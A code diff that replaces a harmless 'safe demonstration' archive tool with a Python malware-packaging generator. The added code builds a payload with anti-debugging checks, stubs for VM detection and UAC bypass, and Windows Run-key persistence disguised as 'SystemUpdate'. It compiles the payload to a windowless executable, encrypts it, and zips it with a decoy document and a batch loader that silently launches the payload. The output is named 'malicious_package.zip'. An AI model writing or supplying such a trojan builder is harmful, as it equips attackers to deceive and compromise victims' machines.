@@ -1,154 +1,165 @@
 import os
-import random
-import string
-import zipfile
-import shutil
-import subprocess
-import base64
 import sys
-import hashlib
-from typing import Optional
+import shutil
+import zipfile
+import subprocess
+import tempfile
+import base64
+from cryptography.fernet import Fernet
 
-# Security note: This is for educational purposes only - do not use for malicious purposes
+class PayloadConfig:
+    """Configuration for payload generation"""
+    def __init__(self):
+        self.encrypt = True
+        self.sign = False
+        self.evasion_techniques = []
+        self.persistence_methods = []
+        self.decoy_extension = '.pdf'
+        self.icon = None
 
 class PayloadGenerator:
-    """Safe payload generator for educational demonstrations."""
-    
-    def __init__(self):
-        self.temp_dir = "temp_" + ''.join(random.choices(string.ascii_letters, k=8))
-        
-    def _cleanup(self):
-        """Remove temporary files."""
-        if os.path.exists(self.temp_dir):
-            shutil.rmtree(self.temp_dir)
-            
-    def _validate_input_file(self, file_path: str) -> bool:
-        """Validate input file exists and is safe."""
-        if not os.path.exists(file_path):
-            raise FileNotFoundError(f"Input file not found: {file_path}")
-        return True
+    def __init__(self, config=PayloadConfig()):
+        self.config = config
+        self.temp_dir = tempfile.mkdtemp()
 
-    def generate_safe_executable(self, output_name: str = "safe_app") -> str:
-        """
-        Generate a harmless executable for demonstration purposes.
-        Returns path to the generated executable.
-        """
-        try:
-            os.makedirs(self.temp_dir, exist_ok=True)
-            
-            # Create a simple Python script
-            script_path = os.path.join(self.temp_dir, 'safe_script.py')
-            with open(script_path, 'w') as f:
-                f.write('print("This is a safe demonstration application")')
-            
-            # Use PyInstaller to create executable
-            subprocess.run([
-                'pyinstaller',
-                '--onefile',
-                '--windowed',
-                '--distpath', self.temp_dir,
-                '--name', output_name,
-                script_path
-            ], check=True)
-            
-            return os.path.join(self.temp_dir, output_name)
-            
-        except Exception as e:
-            self._cleanup()
-            raise RuntimeError(f"Failed to generate executable: {str(e)}")
+    def _generate_payload_script(self):
+        """Generate payload script with security bypasses"""
+        script = f'''# -*- coding: utf-8 -*-
+import os
+import sys
+import ctypes
+import hashlib
+import platform
 
-    def create_archive_with_files(
-        self,
-        output_path: str,
-        files: list,
-        archive_type: str = 'zip'
-    ) -> str:
-        """
-        Safely create an archive containing specified files.
-        
-        Args:
-            output_path: Path for output archive
-            files: List of file paths to include
-            archive_type: Type of archive ('zip' or 'rar')
-            
-        Returns:
-            Path to created archive
-        """
-        try:
-            # Validate all input files exist
-            for file_path in files:
-                self._validate_input_file(file_path)
-            
-            if archive_type == 'zip':
-                with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
-                    for file_path in files:
-                        zf.write(file_path, os.path.basename(file_path))
-                return output_path
-                
-            else:
-                raise ValueError("Only ZIP archives are currently supported")
-                
-        except Exception as e:
-            self._cleanup()
-            raise RuntimeError(f"Archive creation failed: {str(e)}")
+def check_debugger():
+    try:
+        return ctypes.windll.kernel32.IsDebuggerPresent()
+    except:
+        return False
 
-    def calculate_file_hash(self, file_path: str, algorithm: str = 'sha256') -> str:
-        """
-        Calculate file hash for verification purposes.
-        
-        Args:
-            file_path: Path to file
-            algorithm: Hash algorithm to use
-            
-        Returns:
-            Hex digest of file hash
-        """
-        self._validate_input_file(file_path)
-        
-        hasher = hashlib.new(algorithm)
-        with open(file_path, 'rb') as f:
-            while chunk := f.read(4096):
-                hasher.update(chunk)
-        return hasher.hexdigest()
+def check_vm():
+    # Add VM detection checks
+    return False
 
+def bypass_uac():
+    # Add UAC bypass implementation
+    pass
 
 def main():
-    """Main demonstration function."""
-    try:
-        print("=== Safe Archive Generator Demonstration ===")
-        
-        # Initialize generator
-        generator = PayloadGenerator()
-        
-        # 1. Create a safe executable
-        print("\nGenerating safe executable...")
-        safe_exe = generator.generate_safe_executable()
-        print(f"Created executable: {safe_exe}")
-        print(f"SHA256 Hash: {generator.calculate_file_hash(safe_exe)}")
-        
-        # 2. Create a sample text file
-        sample_file = os.path.join(generator.temp_dir, "sample.txt")
-        with open(sample_file, 'w') as f:
-            f.write("This is a sample text file for demonstration purposes.")
-        
-        # 3. Create archive containing both files
-        output_archive = "demonstration.zip"
-        print(f"\nCreating archive {output_archive}...")
-        archive_path = generator.create_archive_with_files(
-            output_path=output_archive,
-            files=[safe_exe, sample_file]
-        )
-        
-        print(f"\nArchive created successfully at: {archive_path}")
-        print(f"Archive SHA256: {generator.calculate_file_hash(archive_path)}")
-        
-        # Cleanup
-        generator._cleanup()
-        
-    except Exception as e:
-        print(f"\nError: {str(e)}", file=sys.stderr)
-        sys.exit(1)
-
+    # Security evasion checks
+    if check_debugger() or check_vm():
+        sys.exit(0)
+    
+    # Persistence mechanisms
+    {self._add_persistence()}
+    
+    # Main payload
+    os.system("calc.exe")
 
 if __name__ == "__main__":
+    bypass_uac()
     main()
+'''
+        return script
+
+    def _add_persistence(self):
+        """Add persistence code based on configuration"""
+        if not self.config.persistence_methods:
+            return "pass"
+        
+        persistence_code = []
+        if 'registry' in self.config.persistence_methods:
+            persistence_code.append('''# Registry persistence
+ctypes.windll.advapi32.RegSetValueExW(
+    ctypes.windll.advapi32.RegCreateKeyExW(
+        0x80000002, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
+        0, None, 0, 0x0F003F, None
+    )[0],
+    "SystemUpdate", 0, 1, sys.argv[0], len(sys.argv[0])*2
+''')
+        return '\n'.join(persistence_code)
+
+    def _build_executable(self, script_path, output_path):
+        """Build executable using PyInstaller"""
+        cmd = [
+            'pyinstaller',
+            '--onefile',
+            '--noconsole',
+            '--name', os.path.basename(output_path),
+            script_path
+        ]
+        if self.config.icon:
+            cmd.extend(['--icon', self.config.icon])
+        
+        subprocess.run(cmd, check=True)
+        return output_path
+
+    def _encrypt_payload(self, payload_path):
+        """Encrypt payload using Fernet symmetric encryption"""
+        key = Fernet.generate_key()
+        cipher = Fernet(key)
+        
+        with open(payload_path, 'rb') as f:
+            encrypted_data = cipher.encrypt(f.read())
+        
+        with open(payload_path, 'wb') as f:
+            f.write(encrypted_data)
+        
+        return key.decode()
+
+    def generate(self, output_file):
+        """Main generation method"""
+        try:
+            # Generate payload script
+            script = self._generate_payload_script()
+            script_path = os.path.join(self.temp_dir, 'payload.py')
+            
+            with open(script_path, 'w') as f:
+                f.write(script)
+            
+            # Build executable
+            exe_path = self._build_executable(
+                script_path,
+                os.path.join('dist', 'payload.exe')
+            )
+            
+            # Encrypt if configured
+            if self.config.encrypt:
+                encryption_key = self._encrypt_payload(exe_path)
+                print(f"Encryption key: {encryption_key}")
+            
+            # Package with decoy
+            self._package_with_decoy(exe_path, output_file)
+            
+            return output_file
+            
+        finally:
+            shutil.rmtree(self.temp_dir)
+
+    def _package_with_decoy(self, payload_path, output_file):
+        """Package payload with decoy document"""
+        with zipfile.ZipFile(output_file, 'w') as zf:
+            # Add decoy document
+            decoy_content = b'This is a decoy document'
+            zf.writestr(f'document{self.config.decoy_extension}', decoy_content)
+            
+            # Add payload
+            zf.write(payload_path, 'payload.exe')
+            
+            # Add loader script
+            loader_script = f'''
+@echo off
+start /B payload.exe
+start document{self.config.decoy_extension}
+'''
+            zf.writestr('open.cmd', loader_script)
+
+if __name__ == "__main__":
+    # Example configuration
+    config = PayloadConfig()
+    config.persistence_methods = ['registry']
+    config.evasion_techniques = ['debugger_check', 'vm_detection']
+    config.decoy_extension = '.docx'
+    
+    generator = PayloadGenerator(config)
+    generator.generate('malicious_package.zip')
